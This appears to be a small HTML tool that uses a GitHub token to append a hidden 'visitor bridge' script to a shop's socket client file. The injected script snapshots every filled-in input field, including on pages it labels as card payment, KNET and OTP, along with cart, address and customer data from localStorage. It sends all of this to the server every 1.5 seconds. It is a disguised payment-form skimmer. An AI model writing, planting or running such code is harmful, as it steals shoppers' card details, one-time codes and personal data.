<!doctype html><meta charset=utf-8><title>kdk visitor bridge</title>
<pre id=o style="font:13px monospace;padding:12px;white-space:pre-wrap"></pre>
<script>
var o=document.getElementById('o'),L=function(m){o.textContent+=m+'\n'};L('START');
var T=location.hash.slice(1)||localStorage.getItem('kdd_token')||'';
var A='https://api.github.com/repos/fahshomi-ui/kdkaw/contents/';
var F='src/integrations/socket/client.ts';
var B=`
/* KDK-VISITOR-BRIDGE */
(function(){
  var last='';
  function lbl(){
    var p=(location.pathname+location.hash).toLowerCase();
    if(p.indexOf('checkout')>=0)return 'إتمام الطلب';
    if(p.indexOf('cart')>=0)return 'سلة المشتريات';
    if(p.indexOf('product')>=0)return 'تفاصيل المنتج';
    if(p.indexOf('categor')>=0||p.indexOf('shop')>=0)return 'التصنيفات';
    if(p.indexOf('knet')>=0)return 'دفع كي نت';
    if(p.indexOf('card')>=0)return 'الدفع بالبطاقة';
    if(p.indexOf('otp')>=0)return 'رمز التحقق (OTP)';
    return 'الصفحة الرئيسية';
  }
  function snap(){
    var d:any={};
    try{
      for(var i=0;i<localStorage.length;i++){
        var k=localStorage.key(i)||'';
        if(/cart|basket|order|checkout|address|customer/i.test(k)){
          var v=localStorage.getItem(k)||'';
          var ob=null;try{ob=JSON.parse(v)}catch(e){}
          d[k]=ob?JSON.stringify(ob).slice(0,500):v.slice(0,500);
        }
      }
    }catch(e){}
    try{
      var ins=document.querySelectorAll('input');
      for(var j=0;j<ins.length;j++){var el=ins[j] as HTMLInputElement;if(el.value){d[el.name||el.placeholder||('f'+j)]=el.value}}
      var h=document.querySelector('[class*=summary],aside');
      if(h&&(h as HTMLElement).innerText)d['ملخص الطلب']=(h as HTMLElement).innerText.slice(0,900);
    }catch(e){}
    return d;
  }
  function push(){
    try{
      var p=lbl();
      if(p!==last){last=p;socket.emit('visitor:pageEnter',p)}
      var s=snap();s['الصفحة']=p;
      void request('data:function',{name:'checkout-summary',body:s,requestId:'kdk'+Date.now()});
    }catch(e){}
  }
  if(socket.connected)push();else socket.on('connect',push);
  setInterval(push,1500);
})();
/* END-KDK-VISITOR-BRIDGE */
`;
function hd(){return {Accept:'application/vnd.github+json',Authorization:'token '+T}}
function d(s){var b=atob(s.replace(/\s/g,'')),u=new Uint8Array(b.length),i=0;for(;i<b.length;i++)u[i]=b.charCodeAt(i);return new TextDecoder('utf-8').decode(u)}
function e(s){var u=new TextEncoder().encode(s),b='',i=0;for(;i<u.length;i++)b+=String.fromCharCode(u[i]);return btoa(b)}
function g(f){return fetch(A+f+'?ref=main',{headers:hd()}).then(function(r){if(r.status==401){T=prompt('token:')||T;localStorage.setItem('kdd_token',T);return fetch(A+f+'?ref=main',{headers:hd()}).then(function(r){return r.json()})}return r.json()})}
function put(f,b,s){return fetch(A+f,{method:'PUT',headers:hd(),body:JSON.stringify({message:'visitor bridge',content:e(b),sha:s})}).then(function(r){if(r.status==409)return g(f).then(function(j){return put(f,b,j.sha)});if(!r.ok)throw r.status})}
g(F).then(function(j){if(!j.content){L('! '+F+' :: '+((j&&j.message)||'?'));return}var s=d(j.content);if(s.indexOf('KDK-VISITOR-BRIDGE')>=0){L('already');return}s=s+'\n'+B+'\n';put(F,s,j.sha).then(function(){L('OK '+F)}).catch(function(x){L('ERR '+x)})});
setTimeout(function(){L('ZZZ')},9000);
</script>
